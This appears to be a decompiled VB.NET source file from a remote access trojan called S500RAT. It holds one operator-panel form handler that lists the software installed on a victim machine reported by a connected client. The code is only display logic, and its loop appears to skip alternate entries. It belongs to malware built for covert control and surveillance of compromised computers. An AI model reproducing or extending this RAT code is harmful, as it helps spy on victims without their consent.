Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000050 RID: 80
	Public Class FrmInstalledSoftware
		' Token: 0x06001195 RID: 4501 RVA: 0x0009A6AC File Offset: 0x000988AC
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formInstalledSoftware As FormInstalledSoftware = CType(Application.OpenForms("FormInstalledSoftware" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormInstalledSoftware)
				Dim flag As Boolean = formInstalledSoftware IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formInstalledSoftware.Client Is Nothing
					If flag2 Then
						formInstalledSoftware.Client = client
						formInstalledSoftware.Timer1.Enabled = True
					End If
					formInstalledSoftware.ListInstalledSoftware.Rows.Clear()
					Dim asString As String = unpack_msgpack.ForcePathObject("Message").AsString
					Dim array As String() = asString.Split(New String() { "-=>" }, StringSplitOptions.None)
					Dim num As Integer = array.Length - 1
					For i As Integer = 0 To num
						Dim flag3 As Boolean = array(i).Length > 0
						If flag3 Then
							formInstalledSoftware.ListInstalledSoftware.Rows.Add(New Object() { formInstalledSoftware.ImageList1.Images("B.png"), array(i) })
						End If
						i += 1
					Next
					formInstalledSoftware.SoftwareNum.Text = "Installed Softwares  [ " + Conversions.ToString(Conversions.ToInteger(formInstalledSoftware.ListInstalledSoftware.Rows.Count)) + " ]"
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
